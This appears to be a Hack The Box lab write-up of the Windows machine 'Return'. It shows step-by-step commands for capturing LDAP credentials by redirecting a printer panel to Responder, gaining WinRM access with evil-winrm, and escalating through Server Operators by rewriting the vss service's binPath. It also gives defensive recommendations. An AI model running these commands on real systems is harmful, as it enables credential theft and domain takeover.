---
title: "Return — LDAP Credential Capture via Printer Admin Panel"
description: "A printer admin panel's LDAP configuration is redirected to capture service credentials, then Server Operators escalation reaches Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ldap
  - credential-capture
  - server-operators
---

## Summary

Return is an Easy-rated Hack The Box Windows Active Directory lab that demonstrates how a misconfigured printer administration panel leaks service credentials through cleartext LDAP. The recorded chain redirects the panel's LDAP configuration to an attacker-controlled listener, captures a cleartext bind for a service account, uses WinRM for user access, and escalates through `Server Operators` group membership to full Administrator. Every step abuses legitimate functionality; no CVE is involved. Target addresses, passwords, and specific listener details are redacted below; command patterns are preserved.

## Context and Objective

- **Target:** Windows Server (domain-joined, hostname `<TARGET_HOSTNAME>`)
- **Domain:** `<TARGET_DOMAIN>`
- **Services exposed:** DNS (port 53), HTTP/IIS (port 80), Kerberos (port 88), LDAP (port 389), SMB (port 445), WinRM (port 5985)
- **Objective:** Achieve full compromise through the attack surface presented by the printer admin panel and AD misconfigurations
- **Lab context:** Hack The Box lab; all activity described was performed within the platform's isolated lab environment

## Approach and Evidence

### 1. Port Scanning and Host Discovery

Observation: six open TCP services indicating a domain-joined Windows host running DNS, Kerberos, LDAP, SMB, HTTP, and WinRM.

Action: full TCP scan with version and default scripts.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Return-TCP
```

Representative excerpt (truncated):

```text
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows AD LDAP (Domain: <TARGET_DOMAIN>)
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Technical significance: the combination of DNS, Kerberos, LDAP, and SMB confirms an Active Directory domain controller or member server. WinRM on 5985 is a remote management interface that accepts PowerShell over HTTP — any valid domain credential with remote access permissions provides a shell. The hostname resolves to `<TARGET_HOSTNAME>` in the `<TARGET_DOMAIN>` domain.

Result: the recorded output shows a domain-joined Windows host with LDAP, Kerberos, WinRM, and HTTP exposed.

### 2. Printer Admin Panel Discovery

Observation: the HTTP service hosts an "HTB Printer Admin Panel" with a Settings page exposing LDAP configuration fields (server address, port, username, password).

Action: browse the web interface and identify the LDAP configuration form.

Technical significance: the panel stores LDAP connection settings for the printer service. When settings are saved, the application attempts an LDAP bind using the configured credentials. This is a legitimate feature — the printer needs LDAP for user authentication — but it creates an opportunity: if the LDAP server address is changed to an attacker-controlled listener, the next bind attempt will send credentials to the attacker.

Result: the recorded output shows an admin panel with LDAP configuration that accepts arbitrary server addresses.

### 3. LDAP Credential Capture

Observation: the printer service performs an LDAP bind when settings are saved, sending cleartext credentials to the configured server address.

Action: start a credential listener on the attacker VPN interface, then redirect the panel's LDAP server address to the attacker IP and save.

```bash
sudo responder -I tun0
```

The notes show Responder capturing a cleartext LDAP bind after the settings were changed:

```text
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : <TARGET_DOMAIN>\<SERVICE_ACCOUNT>
[LDAP] Cleartext Password : <LDAP_PASSWORD>
```

Technical significance: LDAP transmits credentials in cleartext unless LDAPS (port 636) or channel binding/token protection is enforced. The printer service stored these credentials and attempted a bind on the next configuration save, leaking them directly. The service account belongs to the `<TARGET_DOMAIN>` domain.

Result: the recorded output shows a cleartext LDAP bind capturing service-account credentials.

### 4. Initial Access via WinRM

Observation: the captured credential is valid for WinRM access.

Action: validate the credential with NetExec, then establish a session.

```bash
nxc winrm <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

Representative output:

```text
[+] <TARGET_DOMAIN>\<SERVICE_ACCOUNT>:<SERVICE_ACCOUNT_PASSWORD> (Pwn3d!)
```

```bash
evil-winrm -i <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

The user result is available at `<USER_RESULT_FILE>`.

Technical significance: WinRM (Windows Remote Management) provides a PowerShell session over HTTP. The `(Pwn3d!)` indicator confirms the account has remote execution privileges. The service account has sufficient permissions for interactive login.

Result: the recorded output shows WinRM access established as the service account.

### 5. Privilege Escalation via Server Operators

Observation: the service account is a member of the built-in `Server Operators` group.

Action: confirm group membership, then reconfigure an existing service to add the account to the local Administrators group.

```powershell
whoami /groups
```

Representative output:

```text
BUILTIN\Server Operators
```

```powershell
sc.exe config vss binPath= "cmd.exe /c net localgroup Administrators <SERVICE_ACCOUNT> /add"
sc.exe stop vss
sc.exe start vss
```

After the service restarts, reconnect with WinRM to obtain a token with the updated group membership:

```bash
evil-winrm -i <TARGET_DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<SERVICE_ACCOUNT_PASSWORD>'
```

Verify the new privilege:

```powershell
net localgroup Administrators
```

Representative output:

```text
Members
-------------------------------------------------------------------------------
<LOCAL_ADMINISTRATOR>
Domain Admins
Enterprise Admins
<SERVICE_ACCOUNT>
```

The elevated result is available at `<ELEVATED_RESULT_FILE>`.

Technical significance: `Server Operators` can stop, start, and reconfigure services on the host. By changing the `vss` (Volume Shadow Copy) service binary path to a command that adds the service account to the local Administrators group, then restarting the service, the account gains SYSTEM-level privileges when the service executes the new binary path. After changing group membership, a reconnection is necessary because WinRM tokens reflect group membership at session creation time.

Result: the recorded output shows the service account added to local Administrators, confirming full host compromise.

## Challenges and Decisions

- The LDAP credential capture required no exploitation — simply redirecting the panel's server address to the attacker listener captured cleartext credentials on the next save. The printer service stored and reused the LDAP bind credentials automatically.
- `Server Operators` abuse is a service-level privilege escalation vector distinct from user-level group abuse (e.g., adding to Administrators directly via `net localgroup`). Services can be reconfigured without requiring direct administrative access.

## Outcome

The recorded evidence establishes full compromise of the Return lab through a two-stage chain:

1. **Credential capture:** LDAP cleartext bind redirected to an attacker listener, leaking service-account credentials
2. **Privilege escalation:** `Server Operators` group membership used to reconfigure a service binary path, adding the service account to local Administrators

The chain required no CVE exploitation — every step abused legitimate Active Directory and Windows service functionality. The weakness was the combination of cleartext LDAP transport, credential storage in the printer panel, and overprivileged service account membership in `Server Operators`.

## Lessons and Recommendations

- **LDAPS should be enforced.** LDAP transmits credentials in cleartext by default. Services that store and reuse LDAP bind credentials amplify the risk of credential capture if the server address can be redirected.
- **Printer and appliance admin panels store reusable credentials.** These panels often have weaker access controls than enterprise identity systems, making them attractive targets for credential harvesting.
- **Service accounts should follow least privilege.** The service account had `Server Operators` membership, which is excessive for a printer service. Service accounts should be restricted to the minimum permissions required.
- **After group membership changes, reconnection is required.** Tokens reflect group membership at session creation; a new session is needed to obtain updated privileges.

## References

- Hack The Box lab: [Return](https://app.hackthebox.com/machines/Return) (ID 401)
